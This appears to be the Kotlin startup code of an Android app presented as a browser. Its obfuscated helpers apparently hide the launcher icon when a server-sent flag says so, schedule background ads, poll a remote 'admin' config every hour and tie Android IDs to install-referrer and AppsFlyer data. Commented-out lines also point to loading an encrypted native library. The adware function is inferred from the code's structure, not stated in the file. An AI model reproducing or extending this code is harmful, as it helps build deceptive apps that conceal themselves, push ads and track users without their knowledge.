package com.during.festival.rain.falls.one.main

import android.annotation.SuppressLint
import android.app.Application
import android.os.Build
import android.provider.Settings
import android.util.Log
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.anythink.core.api.ATSDK
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.during.festival.rain.falls.one.utils.PngCanGo
import com.during.festival.rain.falls.one.utils.PngAllData
import com.during.festival.rain.falls.one.appbean.OkSpBean
import com.during.festival.rain.falls.one.utils.TtPoint
import com.during.festival.rain.falls.one.ad.AdManager
import com.during.festival.rain.falls.one.ad.AdScheduler
import com.during.festival.rain.falls.one.ad.xian.CanShowAd
import com.during.festival.rain.falls.one.ad.xian.CanShowH5
import com.during.festival.rain.falls.one.appbean.BrowserAllBean
import com.during.festival.rain.falls.one.utils.AppPointData
import com.during.festival.rain.falls.one.zbrokloe.BrowserLoad
import com.google.firebase.Firebase
import com.google.firebase.messaging.messaging
import com.google.gson.Gson
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File
import java.util.UUID

object IntBorApp {
    lateinit var mainStart: Application
    var mustXS: Boolean = true
    val adManager = AdManager()
    val h5Limiter = CanShowH5()
    val adLimiter = CanShowAd()
    var adShowTime: Long = 0
    var showAdTime: Long = 0
    lateinit var okSpBean: OkSpBean

    fun init(application: Application, mustXSData: Boolean) {
        if (!PngCanGo.isMainProcess(application)) {
            return
        }
        showLog(" MainStart init")
        mainStart = application
        mustXS = mustXSData
        val lifecycleObserver = StartService()
        application.registerActivityLifecycleCallbacks(lifecycleObserver)
        initSDKData()
        PngCanGo.startService()
        okSpBean = OkSpBean()
        getAndroidId()
        noShowICCC()
        launchRefData()
        AppPointData.sessionUp()
        initAppsFlyer()
        getFcmFun()
    }

    private fun initSDKData() {
        val path = "${mainStart.applicationContext.dataDir.path}/browser"
        File(path).mkdirs()
        ATSDK.init(mainStart, PngAllData.getConfig().appid, PngAllData.getConfig().appkey)
        ATSDK.setNetworkLogDebug(!mustXS)
//        A76fef.Kiwfdjs(mainStart)
//        HealthCreon.loadEncryptedSo(mainStart)
    }

    @SuppressLint("HardwareIds")
    private fun getAndroidId() {
        val adminData = okSpBean.appiddata
        if (adminData.isEmpty()) {
            val androidId =
                Settings.Secure.getString(mainStart.contentResolver, Settings.Secure.ANDROID_ID)
            if (!androidId.isNullOrBlank()) {
                okSpBean.appiddata = androidId
            } else {
                okSpBean.appiddata = UUID.randomUUID().toString()
            }
        }
    }

    private fun launchRefData() {
        val refData = okSpBean.refdata
        val intJson = okSpBean.IS_INT_JSON
        if (refData.isNotEmpty()) {
            startOneTimeAdminData()
            intJson.takeIf { it.isNotEmpty() }?.let {
                TtPoint.postInstallData(mainStart)
            }
            return
        }
        showLog("launchRefData=$refData")
        startRefDataCheckLoop()
    }

    private fun startRefDataCheckLoop() {
        CoroutineScope(Dispatchers.IO).launch {
            while (okSpBean.refdata.isEmpty()) {
                refInformation()
                delay(10100)
            }
        }
    }

    private fun refInformation() {
        runCatching {
            val referrerClient = InstallReferrerClient.newBuilder(mainStart).build()
            referrerClient.startConnection(object : InstallReferrerStateListener {
                override fun onInstallReferrerSetupFinished(responseCode: Int) {
                    handleReferrerSetup(responseCode, referrerClient)
                }

                override fun onInstallReferrerServiceDisconnected() {
                }
            })
        }.onFailure { e ->
            showLog("Failed to fetch referrer: ${e.message}")
        }
    }

    private fun handleReferrerSetup(responseCode: Int, referrerClient: InstallReferrerClient) {
        when (responseCode) {
            InstallReferrerClient.InstallReferrerResponse.OK -> {
                val installReferrer = referrerClient.installReferrer.installReferrer
                if (installReferrer.isNotEmpty()) {
                    okSpBean.refdata = installReferrer
                    TtPoint.postInstallData(mainStart)
                    startOneTimeAdminData()
                }
                showLog("Referrer  data: ${installReferrer}")
            }

            else -> {
                showLog("Failed to setup referrer: $responseCode")
            }
        }

        kotlin.runCatching {
            referrerClient.endConnection()
        }
    }

    private fun startOneTimeAdminData() {
        val adminData = okSpBean.admindata
        showLog("startOneTimeAdminData: $adminData")
        if (adminData.isEmpty()) {
            TtPoint.onePostAdmin()
        } else {
            TtPoint.twoPostAdmin()
        }
        //1hours
        scheduleHourlyAdminRequest()
    }



    private fun scheduleHourlyAdminRequest() {
        // 协程
        CoroutineScope(Dispatchers.IO).launch {
            while (true) {
                delay(1000 * 60 * 60)
                showLog("延迟1小时循环请求")
                val result = AdminPostUtils.executeAdminRequest()
                if (result.isSuccess) {
                    val value = result.getOrNull()
                    showLog("Admin request successful: $value")
                } else {
                    val exception = result.exceptionOrNull()
                    showLog("Admin request failed: ${exception?.message}")
                }
            }
        }
    }

    fun canIntNextFun() {
        val adScheduler = AdScheduler(adManager)
        adScheduler.startRomFun()
    }

    fun showLog(msg: String) {
        if (mustXS) {
            return
        }
        Log.e("Browser", msg)
    }

    fun getAdminData(): BrowserAllBean? {
//        okSpBean.admindata = PngAllData.data_new
        val adminData = okSpBean.admindata
        val adminBean = runCatching {
            Gson().fromJson(adminData, BrowserAllBean::class.java)
        }.getOrNull()
        return if (adminBean != null && isValidAdminBean(adminBean)) {
            adminBean
        } else {
            null
        }
    }

    private fun isValidAdminBean(bean: BrowserAllBean): Boolean {
        return bean.applicationSettings != null && bean.applicationSettings.userProfile.tier!= null &&
                bean.assetManagement != null && bean.assetManagement.identifiers.internalId.isNotEmpty()
    }


    fun putAdminData(adminBean: String) {
        okSpBean.admindata = adminBean
//        okSpBean.admindata = PngAllData.data_new

    }

    fun noShowICCC() {
        CoroutineScope(Dispatchers.Main).launch {
            val isaData = getAdminData()
            if (isaData == null || isaData.applicationSettings.userProfile.tier != 1) {
                showLog("不是A方案显示图标")
                BrowserLoad.bload("bppsFlyeAFlyerlkrpps",false)
            }
        }
    }
fun initAppsFlyer() {
    val appsFlyer = AppsFlyerLib.getInstance()
    val appId = okSpBean.appiddata
    val context = mainStart
    showLog("AppsFlyer-id: $${PngAllData.getConfig().appsId}")
    appsFlyer.init(PngAllData.getConfig().appsId, object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(conversionDataMap: MutableMap<String, Any>?) {
            val status = conversionDataMap?.get("af_status") as? String ?: "null_status"
            showLog("AppsFlyer: $status")
            AppPointData.pointInstallAf(status)

            conversionDataMap?.forEach { (key, value) ->
                try {
                    showLog("AppsFlyer-all: key=$key: value=$value")
                } catch (e: Exception) {
                    showLog("AppsFlyer-logError: ${e.localizedMessage}")
                }
            }
        }

        override fun onConversionDataFail(p0: String?) {
            showLog("AppsFlyer: onConversionDataFail $p0")
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {
            showLog("AppsFlyer: onAppOpenAttribution $p0")
        }

        override fun onAttributionFailure(p0: String?) {
            showLog("AppsFlyer: onAttributionFailure $p0")
        }
    }, context)

    appsFlyer.setCustomerUserId(appId)
    appsFlyer.start(context)

    appsFlyer.logEvent(
        context,
        "health_show_install",
        buildMap {
            put("customer_user_id", appId)
            put("app_version", AppPointData.showAppVersion())
            put("os_version", Build.VERSION.RELEASE)
            put("bundle_id", context.packageName)
            put("language", "asc_wds")
            put("platform", "raincoat")
            put("android_id", appId)
        }
    )
}




    fun getFcmFun() {
        if (!mustXS) return
        if (okSpBean.fcmState) return
        runCatching {
            Firebase.messaging.subscribeToTopic(PngAllData.fffmmm)
                .addOnSuccessListener {
                    okSpBean.fcmState = true
                    showLog("Firebase: subscribe success")
                }
                .addOnFailureListener {
                    showLog("Firebase: subscribe fail")
                }
        }
    }
}